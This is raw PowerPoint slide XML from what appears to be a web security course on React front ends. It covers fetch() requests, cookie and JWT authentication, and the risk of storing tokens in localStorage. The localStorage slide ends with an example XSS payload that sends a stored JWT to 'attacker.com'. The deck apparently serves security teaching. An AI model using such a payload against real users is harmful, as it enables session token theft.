                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>fetch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>url</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>then</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response </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=&gt;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response</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json</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>())</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1732545" y="3375980"/>
            <a:ext cx="6603991" cy="2308324"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2">
              <a:lumMod val="95000"/>
            </a:schemeClr>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>fetch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>url</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body</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JSON</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stringify</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data</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headers</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'Content-Type'</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'application/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>json</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method</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'POST'</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mode</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>cors</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a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>then</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response </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=&gt;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response</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json</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>())</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="TextBox 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609599" y="1818171"/>
            <a:ext cx="843602" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>GET</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="TextBox 10"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609594" y="3271084"/>
            <a:ext cx="813043" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>POST</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1800" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609594" y="2302477"/>
            <a:ext cx="11004887" cy="1041419"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:normAutofit lnSpcReduction="10000"/>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Modifying server state:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>By default fetch() uses the GET &gt; exposes data to the proxies and logs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Set the 'method' attribute to POST in the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>init</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> object</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Content Placeholder 2"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609594" y="5796598"/>
            <a:ext cx="11004887" cy="444112"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:normAutofit/>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Alternatives to fetch() – wrappers around </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>XMLHttpRequest</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, e.g. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>axios</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="160551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Request Authentication</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1414463"/>
            <a:ext cx="5406189" cy="5008108"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Authenticated requests:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Cookies - set 'credentials' to 'same-site' unless using CORS </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>JWT tokens – add 'Authorization' header</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="2400" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>Security considerations:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Make sure the fetched URL cannot be modified by an attacker</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Rectangle 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400548" y="1211574"/>
            <a:ext cx="5160081" cy="2554545"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2">
              <a:lumMod val="95000"/>
            </a:schemeClr>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>fetch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>url</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body</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JSON</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stringify</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data</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>credentials</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'same-origin'</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headers</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'Content-Type'</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'application/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>json</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>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method</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'POST'</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mode</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a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>cors</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a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>then</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response </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=&gt;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response</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json</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>())</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400548" y="3918517"/>
            <a:ext cx="5160080" cy="2554545"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2">
              <a:lumMod val="95000"/>
            </a:schemeClr>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>fetch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>url</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body</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JSON</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stringify</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data</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headers</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'Content-Type'</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'application/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>json</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b="1" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'Authorization'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> `Bearer $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>token</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>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method</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'POST'</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mode</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i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>cors</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 </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br>
              <a:rPr lang="en-US" sz="1600" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>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a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>then</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>response </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>=&gt;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response</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json</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>())</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1600" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="604026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Leaking Sensitive Data into </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>localStorage</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Content Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="1414463"/>
            <a:ext cx="10972800" cy="3044916"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="92500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>React doesn’t provide a wrapper around </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>localStorage</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Other libraries do: store.js, cross-storage, redux-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>localstorage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, etc.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Problem: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>applications store JWTs, OAuth tokens, API keys in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>localStorage</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>sensitive data is not cleared on logout</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Example scenario:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="635508" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JWT stored in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>localStorage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to be accessed across tabs</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="635508" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>JWT has a long expiration period since it’s used as a session id</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="635508" lvl="1" indent="-342900">
              <a:buFont typeface="+mj-lt"/>
              <a:buAutoNum type="arabicPeriod"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>User clicks on a phishing link -&gt; XSS is executed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Rectangle 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="609600" y="4919552"/>
            <a:ext cx="10972800" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg2">
              <a:lumMod val="95000"/>
            </a:schemeClr>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>fetch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'http://attacker.com/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>logger?token</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r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>localStorage</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>getItem</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="777777"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" i="1" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>jwtToken</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" i="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8B0000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>'</a:t>
            </a:r>
